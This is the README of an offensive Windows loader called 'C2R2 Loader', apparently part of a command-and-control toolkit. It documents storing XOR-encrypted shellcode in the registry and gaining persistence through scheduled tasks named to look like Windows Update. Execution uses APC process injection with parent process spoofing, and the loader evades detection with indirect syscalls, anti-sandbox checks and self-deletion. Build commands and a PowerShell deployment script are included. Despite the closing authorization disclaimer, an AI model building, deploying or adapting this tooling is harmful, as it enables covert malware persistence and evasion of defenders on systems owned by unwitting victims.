# C2R2 Loader

A minimalist, stealthy loader for registry-based persistence with process injection.

## Architecture Overview

```
┌─────────────────────────────────────────────────┐
│  REGISTRY (XOR encrypted shellcode)            │
│  - Key: HKCU\Software\<legit-looking-name>     │
│  - Data: XOR encrypted shellcode (donut)       │
└─────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────┐
│  SCHEDULED TASK (conditional trigger)          │
│  - On Logon / On Idle / Daily at X time        │
│  - Executes: Minimalist Loader                 │
└─────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────┐
│  LOADER (small binary)                         │
│  1. Read registry                              │
│  2. XOR decrypt                                │
│  3. Process injection (QueueUserAPC)           │
│  4. Self-delete (optional)                     │
└─────────────────────────────────────────────────┘
```

## Features

### Evasion Techniques

1. **Polymorphic XOR Key**: Each deployment generates a unique 32-byte XOR key for encryption
2. **Polymorphic Registry Names**: Legitimate-looking registry key and value names
3. **Jitter Timing**: Random delays (1-5 seconds) before execution to evade behavioral analysis
4. **Parent Process Spoofing**: Spawns injected process under explorer.exe
5. **Indirect Syscalls**: Uses dinvk for NtAllocateVirtualMemory/NtWriteVirtualMemory/NtProtectVirtualMemory
6. **Anti-Sandbox Checks**: 
   - System uptime check (minimum 3 minutes)
   - CPU core count check (minimum 2 cores)
   - Physical memory check (minimum 4GB)
   - Debugger detection
   - Mouse movement detection
7. **Self-Delete**: Removes itself after execution in production mode

### Process Injection

Uses QueueUserAPC injection with Parent Process Spoofing:
1. Find explorer.exe PID
2. Create suspended process (RuntimeBroker.exe) with explorer.exe as parent
3. Allocate RW memory in target process via indirect syscall
4. Write shellcode to target process
5. Change memory protection to RX
6. Queue APC to execute shellcode
7. Resume thread to trigger APC execution

## Usage

### Prerequisites

1. **Rust toolchain** with Windows cross-compilation target:
   ```bash
   rustup target add x86_64-pc-windows-gnu
   ```

2. **MinGW-w64** for cross-compilation:
   ```bash
   apt install mingw-w64
   ```

3. **Donut** for shellcode generation:
   ```bash
   # Download from https://github.com/TheWover/donut
   donut.exe -i agent.exe -o shellcode.bin -f 1 -a 2
   ```

### Building the Loader

```bash
# Build loader for development
cargo build -p loader

# Build loader for production (stealthy, no console)
cargo build --release --target x86_64-pc-windows-gnu --features production -p loader
```

### Generating Deployment Package

```bash
# Generate loader with On Logon trigger
builder build-loader --shellcode shellcode.bin --output deploy_dir --trigger logon

# Generate loader with On Idle trigger
builder build-loader --shellcode shellcode.bin --output deploy_dir --trigger idle

# Generate loader with Daily trigger at 08:30
builder build-loader --shellcode shellcode.bin --output deploy_dir --trigger daily:08:30
```

### Patching Existing Loader

```bash
# Patch loader with new polymorphic configuration
builder patch-loader --input loader.exe --output patched_loader.exe

# Patch with specific registry key name
builder patch-loader --input loader.exe --output patched_loader.exe --reg-key MyCustomKey --reg-value Data
```

## Deployment

The `build-loader` command generates a deployment package containing:

1. **loader.exe**: Patched loader binary with polymorphic configuration
2. **deploy.ps1**: PowerShell script that:
   - Writes encrypted shellcode to registry
   - Creates scheduled task with specified trigger

### Manual Deployment

1. Copy the loader to target system
2. Run the deploy.ps1 script as administrator
3. The loader will execute on the configured trigger

### Example Deploy Script

```powershell
# Write shellcode to registry
$RegPath = "HKCU:\Software\WindowsUpdateService123"
$ShellcodeB64 = "BASE64_ENCODED_ENCRYPTED_SHELLCODE"
$ShellcodeBytes = [Convert]::FromBase64String($ShellcodeB64)
New-Item -Path $RegPath -Force | Out-Null
Set-ItemProperty -Path $RegPath -Name "Data" -Value $ShellcodeBytes -Type Binary

# Create scheduled task
$TaskXML = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <!-- Task XML content -->
</Task>
"@
Register-ScheduledTask -Xml $TaskXML -TaskName "Microsoft\Windows\WindowsUpdate\Automatic App Update" -Force
```

## Cleanup

To remove persistence:

```powershell
# Remove registry key
Remove-Item -Path "HKCU:\Software\<key_name>" -Force

# Remove scheduled task
Unregister-ScheduledTask -TaskName "<task_name>" -Confirm:$false

# Delete loader binary
Remove-Item -Path "<loader_path>" -Force
```

## Security Considerations

⚠️ **WARNING**: This tool is for authorized penetration testing and red team operations only. Unauthorized use is illegal.

- Never use on systems without explicit written authorization
- Comply with all applicable laws and regulations
- Document all testing activities
- Use in isolated test environments when possible

## Technical Details

### Registry Key Structure

```
HKCU\Software\<polymorphic_name>
  └── <value_name> (REG_BINARY) = XOR_encrypted_shellcode
```

### Binary Markers (for patching)

- XOR Key: `C2R2_LOADER_XOR_KEY_PLACEHOLDER_` (32 bytes marker + 32 bytes key)
- Registry Key: `C2R2_LOADER_REGKEY_PLACEHOLDER___` (32 bytes marker + 64 bytes name)
- Registry Value: `C2R2_LOADER_REGVAL_PLACEHOLDER___` (32 bytes marker + 32 bytes name)

### Scheduled Task Triggers

| Trigger | Description |
|---------|-------------|
| `logon` | Executes when user logs in |
| `idle` | Executes when system is idle |
| `daily:HH:MM` | Executes daily at specified time |

## License

See the main project LICENSE file.
